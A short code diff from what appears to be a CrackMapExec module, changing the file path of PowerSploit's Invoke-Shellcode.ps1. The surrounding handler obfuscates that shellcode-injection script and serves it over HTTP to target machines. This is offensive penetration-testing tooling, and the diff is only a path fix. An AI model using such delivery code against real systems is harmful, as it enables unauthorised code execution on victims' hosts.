@@ -75,7 +75,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('CodeExecution/Invoke-Shellcode.ps1'), 'r') as ps_script:
+            with open(get_ps_script('PowerSploit/CodeExecution/Invoke-Shellcode.ps1'), 'r') as ps_script:
                 ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                 request.wfile.write(ps_script)
 
